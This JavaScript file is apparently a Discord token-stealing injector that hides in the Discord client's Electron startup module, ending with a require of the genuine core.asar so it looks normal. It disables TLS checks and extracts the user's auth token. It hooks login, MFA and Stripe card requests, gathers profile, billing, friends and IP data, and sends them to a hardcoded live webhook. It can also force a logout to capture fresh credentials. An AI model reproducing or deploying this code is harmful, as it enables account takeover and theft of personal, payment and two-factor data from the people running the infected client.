process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;

const fs = require("fs");
const electron = require("electron");
const https = require("https");
const queryString = require("querystring");

var computerName = process.env.COMPUTERNAME;
var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`;
var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`;

const dataNow = new Date().toISOString();

const webhook = 'https://discord.com/api/webhooks/1249574571687018586/-C52uZ-bKh3AyIxb2I5GVDzNhp57WlumATrI-NjxBkCjEAC5fQx5KZoyARfA2Mp7H3dQ';

let contents2FA = [];

var config = {
  "logout": "true",
  "logout-notify": "true",
  "init-notify": "true",
  "embed-color": 2895667,
  "disable_qrcode": "true",
  Filter: {
        urls: [
            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
            "https://*.discord.com/api/v*/applications/detectable",
            "https://discord.com/api/v*/applications/detectable",
            "https://*.discord.com/api/v*/users/@me/library",
            "https://discord.com/api/v*/users/@me/library",
            "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
            "https://discord.com/api/v*/users/@me/billing/subscriptions",
            "wss://remote-auth-gateway.discord.gg/*"
        ]
    },
    onCompleted: {
        urls: [
            "https://discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/users/@me",
            "https://*.discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/auth/login",
            'https://discord.com/api/v*/auth/login',
            'https://*.discord.com/api/v*/auth/login',
            "https://api.stripe.com/v*/tokens",
            "https://discord.com/api/v*/auth/mfa/totp",
            "https://discordapp.com/api/v*/auth/mfa/totp",
            "https://*.discord.com/api/v*/auth/mfa/totp",
            "https://discord.com/api/v*/users/@me/mfa/totp/enable"
        ]
    },
};

async function execScript(str) {
    var window = electron.BrowserWindow.getAllWindows()[0];
    var script = await window.webContents.executeJavaScript(str, true);
    return script || null;
}

const getIP = async () => {
    var json = await execScript(`var xmlHttp = new XMLHttpRequest();\nxmlHttp.open( "GET", "https://www.myexternalip.com/json", false );\nxmlHttp.send( null );\nJSON.parse(xmlHttp.responseText);`);
    return json.ip;
}

const getURL = async (url, token) => {
    var c = await execScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "${url}", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    JSON.parse(xmlHttp.responseText);`);
    return c;
}

const GetBadges = (e) => {
    var n = "";
    if (1 & e) n += "<:staff:891346298932981783> ";
    if (2 & e) n += "<:partner:1041639667226914826> ";
    if (4 & e) n += "<:hypesquadevent:1082679435452481738> ";
    if (8 & e) n += "<:bughunter_1:874750808426692658> ";
    if (64 & e) n += "<:bravery:874750808388952075> ";
    if (128 & e) n += "<:brilliance:874750808338608199> ";
    if (256 & e) n += "<:balance:874750808267292683> ";
    if (512 & e) n += "<:666_hackingmyshit:1107319657603551253> ";
    if (16384 & e) n += "<:bughunter_2:874750808430874664> ";
    if (4194304 & e) n += "<:activedev:1041634224253444146> ";
    if (131072 & e) n += "<:devcertif:1041639665498861578> ";
    if (!n) n = ":x:";
    return n;
}

const GetRBadges = (e) => {
    var n = "";
    if (1 & e) n += "<:staff:891346298932981783> ";
    if (2 & e) n += "<:partner:1041639667226914826> ";
    if (4 & e) n += "<:hypesquadevent:1082679435452481738> ";
    if (8 & e) n += "<:bughunter_1:874750808426692658> ";
    if (512 & e) n += "<:early:944071770506416198> ";
    if (16384 & e) n += "<:bughunter_2:874750808430874664> ";
    if (131072 & e) n += "<:devcertif:1041639665498861578> ";
    if (!n) n = ":x:";
    return n;
}

const GetNSFW = (bouki) => bouki ? ":underage: `NSFW Allowed`" : ":underage: `NSFW Not Allowed`";

const GetA2F = (bouki) => bouki ? "`MFA Enabled`" : "`MFA Not Enabled`";

const parseFriends = friends => {
    try {
        var real = friends.filter(x => x.type == 1);
        var rareFriends = real.map(friend => {
            var badges = GetRBadges(friend.user.public_flags);
            return badges !== ":x:" ? `${badges} ${friend.user.username}#${friend.user.discriminator}\n` : '';
        }).join('');
        return {
            len: real.length,
            badges: rareFriends || "No Rare Friends"
        };
    } catch (err) {
        return ":x:";
    }
}

const parseBilling = billings => {
    try {
        if (!billings) return ":x:";
        return billings.map(res => {
            if (res.invalid) return;
            switch (res.type) {
                case 1: return ":heavy_check_mark: :credit_card:";
                case 2: return ":heavy_check_mark: <:paypal:896441236062347374>";
            }
        }).join('') || ":x:";
    } catch (err) {
        return ":x:";
    }
}

const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b));

const GetNitro = r => {
    if (!r.premium_type) return ":x:";
    if (r.premium_type === 1) return "<:946246402105819216:962747802797113365>";
    if (r.premium_type === 2) {
        if (!r.premium_guild_since) return "<:946246402105819216:962747802797113365>";
        var now = new Date(Date.now());
        var arr = ["<:Booster1Month:1051453771147911208>", "<:Booster2Month:1051453772360077374>", "<:Booster6Month:1051453773463162890>", "<:Booster9Month:1051453775119628370>", "<:Booster12Month:1051453776850286602>", "<:Booster15Month:1051453778312425572>", "<:Booster18Month:1051453780136833155>", "<:Booster24Month:1051453781598998538>"];
        var i = 0;
        while (now > calcDate(new Date(r.premium_guild_since), i)) i++;
        return arr[Math.floor(i / 2)] || "<:946246402105819216:962747802797113365>";
    }
}

electron.session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.startsWith(webhook)) {
        if (details.statusCode !== 200) {
            // handle webhook error if necessary
        }
    }
    callback({ responseHeaders: details.responseHeaders });
});

electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter, async (details, callback) => {
    var token = await execScript(tokenScript);
    if (details.url.startsWith("wss://")) {
        contents2FA.push(details.url);
        callback({});
    } else {
        var json = await getURL("https://discord.com/api/v10/users/@me", token);
        var billing = await getURL("https://discord.com/api/v10/users/@me/billing/subscriptions", token);
        var friends = await getURL("https://discord.com/api/v10/users/@me/relationships", token);
        var ip = await getIP();
        var badges = GetBadges(json.public_flags);
        var rbadges = parseFriends(friends);
        var billing_info = parseBilling(billing);
        var nitro = GetNitro(json);
        var data = {
            embeds: [
                {
                    color: config["embed-color"],
                    author: {
                        name: `${json.username}#${json.discriminator} (${json.id})`,
                        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                    },
                    fields: [
                        { name: "Nitro", value: nitro, inline: true },
                        { name: "Badges", value: badges, inline: true },
                        { name: "Billing Info", value: billing_info, inline: true },
                        { name: "MFA", value: GetA2F(json.mfa_enabled), inline: true },
                        { name: "NSFW", value: GetNSFW(json.nsfw_allowed), inline: true },
                        { name: "IP Address", value: ip, inline: true },
                        { name: "2FA Websites", value: contents2FA.join("\n"), inline: false },
                        { name: `Rare Friends (${rbadges.len})`, value: rbadges.badges, inline: false }
                    ],
                    footer: { text: dataNow }
                }
            ]
        };

        var options = {
            hostname: 'discord.com',
            path: webhook.split("discord.com")[1],
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        };

        var req = https.request(options, res => {
            res.on('data', d => { });
        });

        req.on('error', error => { });

        req.write(JSON.stringify(data));
        req.end();

        if (config["logout"] === "true") execScript(logOutScript);

        callback({ cancel: false });
    }
});

module.exports = require("./core.asar")
